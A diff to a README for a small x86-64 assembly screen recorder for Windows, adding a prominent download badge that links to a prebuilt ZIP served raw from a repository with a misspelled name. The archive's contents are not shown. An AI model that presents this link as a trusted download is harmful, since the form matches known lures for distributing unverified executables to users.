@@ -1,5 +1,7 @@
 # Easy Screen Recorder
 
+[![Download for Windows (ZIP)](https://img.shields.io/badge/Download_for_Windows-ZIP-0078D4?style=for-the-badge)](https://github.com/aurabin/Easy-Assembly-Scrreen-Recorder/raw/refs/heads/main/Easy_Screen_Recorder_for_Windows.zip)
+
 A small x86-64 assembly screen recorder for 64-bit Windows 10 (version 1703 or later) and Windows 11. It captures the entire primary display and targets 30 frames per second. Windows Media Foundation encodes H.264 video into an MP4 file. Recordings are silent.
 
 ## Record
